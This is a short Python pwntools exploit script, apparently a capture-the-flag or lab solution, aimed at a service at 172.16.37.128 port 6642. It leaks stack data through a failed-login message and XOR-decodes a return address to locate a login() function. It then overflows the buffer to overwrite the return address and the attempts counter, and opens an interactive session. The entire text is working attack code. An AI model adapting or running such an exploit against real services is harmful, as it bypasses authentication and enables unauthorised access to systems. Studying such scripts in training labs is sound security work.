from pwn import *

r = remote("172.16.37.128", 6642)

# Info leak + find out the address of login()

r.sendline ("A" * 32)
r.sendline ("\x03" * 32)
r.recvuntil("Authentication failed for user ")

stack = r.recvline() 
attempts = stack[68:72]
bad_ret = stack[84:88]

ret = struct.unpack('<I', bad_ret)[0]
ret = ret ^ 0x42424242
login = (ret & 0xfffff000) + 0xaf4
log.info("ret: {}".format(hex(ret)))
log.info("login: {}\n".format(hex(login)))

# Rewrite RET with address of login() + set attempts to 0 to exit

login = p32(login)
bad_ret = struct.unpack('>I', bad_ret)[0]
login = struct.unpack('>I', login)[0]
attempts = struct.unpack('>I', attempts)[0]

xor = bad_ret ^ login
passwordRet = xor ^ 0x41414141
passwordRet = struct.pack('>I', passwordRet)

xorAttempts = attempts ^ 0xFEFFFFFF
passwordAttempts = xorAttempts ^ 0x41414141
passwordAttempts = struct.pack('>I', passwordAttempts)

r.sendline ("A" * 32)
r.sendline ("BBBB" + passwordAttempts + "BBBB" + "BBBB" + "CCCC" + passwordRet + "DDDDDDDD")
r.send("\n\n")

r.interactive()
